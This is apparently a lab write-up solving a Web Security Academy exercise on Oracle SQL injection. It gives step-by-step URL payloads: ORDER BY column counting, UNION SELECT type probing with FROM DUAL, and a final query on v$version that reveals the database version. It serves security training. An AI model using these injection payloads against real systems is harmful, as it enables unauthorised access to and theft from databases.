**SQL Injection — Lab #7 SQL injection attack, querying the database type and version on Oracle**

<img width="1100" height="456" alt="image" src="https://github.com/user-attachments/assets/0973676d-7b10-4fa1-846b-19fa5bc4dbef" />

As per description of the Lab, product category is vulnerable to SQLi.

End goal of the lab is to display the version

Lets start the Lab

<img width="1100" height="322" alt="image" src="https://github.com/user-attachments/assets/ef911f4f-5f52-4649-ae9a-ee5a09bb9968" />

As per Lab description Product Category is vulnerable to SQL injection attack.

Lets quickly validate

<img width="1100" height="232" alt="image" src="https://github.com/user-attachments/assets/7a488ee5-33b3-4819-9cd3-1705427d692b" />

We got an error.

<img width="1006" height="492" alt="image" src="https://github.com/user-attachments/assets/be0a430b-597c-419c-9eec-b1bf98d4db77" />

This time we dont get any error and SQL query got executed.

Now, for performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.
2. We need to know the data type of the columns.
   
**STEP 1>** Need to determine number of columns

***web-security-academy.net/filter?category=Lifestyle’ ORDER BY 1 --***

<img width="1100" height="474" alt="image" src="https://github.com/user-attachments/assets/9dab3f18-57b7-4a9b-97e6-70a4e74eb284" />

***web-security-academy.net/filter?category=Lifestyle’ ORDER BY 2 --***

<img width="1100" height="535" alt="image" src="https://github.com/user-attachments/assets/960f42f8-e1f9-4371-97ee-9c4c33bb2083" />

***web-security-academy.net/filter?category=Lifestyle’ ORDER BY 3 --***

<img width="1100" height="285" alt="image" src="https://github.com/user-attachments/assets/05c9f191-33a6-4464-95e2-2f9f20f7de21" />

We got an error. It means there are two columns in the Table which is obvious. One is for Title and one for Description

<img width="1100" height="660" alt="image" src="https://github.com/user-attachments/assets/7ca684d6-0b69-4791-ad78-3abcf2b5c055" />

**SETP 2>** We need to know the data type of the columns.

***web-security-academy.net/filter?category=Lifestyle’ UNION SELECT ‘a’, NULL --***

<img width="1100" height="297" alt="image" src="https://github.com/user-attachments/assets/0c206aee-fbfc-4183-8e8e-05fac8826aca" />

***web-security-academy.net/filter?category=Lifestyle’ UNION SELECT null, ‘a’--***

<img width="1100" height="264" alt="image" src="https://github.com/user-attachments/assets/35f69717-e205-4c9a-9c9b-ceb7f77d8633" />

We again got an error message.

We understand that both columns are String data type. This is Oracle data base. In Oracle there is something call DUAL table.

DUAL is a special one-row, one-column table in Oracle Database.

It exists mainly so you can run a SELECT statement without querying a real table.

<img width="805" height="576" alt="image" src="https://github.com/user-attachments/assets/e5169182-584f-44ec-bf4e-c694f587bdf6" />

On other Databases MySQL / PostgreSQL / SQL Server do not need FROM DUAL query

Lets try again

***web-security-academy.net/filter?category=Lifestyle’ UNION SELECT ‘a’ , null FROM DUAL --***

<img width="1100" height="709" alt="image" src="https://github.com/user-attachments/assets/bf10872e-320a-4ad9-839d-75aa044d9ce5" />

It worked. Lets check for other column

<img width="1100" height="711" alt="image" src="https://github.com/user-attachments/assets/b5de1641-8265-478a-b9d1-f5e9d1fa797a" />

So we confirm that both column have strings data type.

Now, to solve the Lab we need to output the version of the Oracle Database

In the Hint of the Lab, there is a SQL Injection Cheat Sheet. From there we found the query for Oracle to display its version

<img width="1100" height="296" alt="image" src="https://github.com/user-attachments/assets/af10b482-d49f-42b3-970b-4cbaf3ed7b28" />

Now, lets make our payload

***web-security-academy.net/filter?category=Lifestyle’ UNION SELECT banner, NULL from v$version --***


<img width="1100" height="435" alt="image" src="https://github.com/user-attachments/assets/8dee4fb4-ed8d-4548-86a8-cb79a45e6366" />

And Lab is solved.
















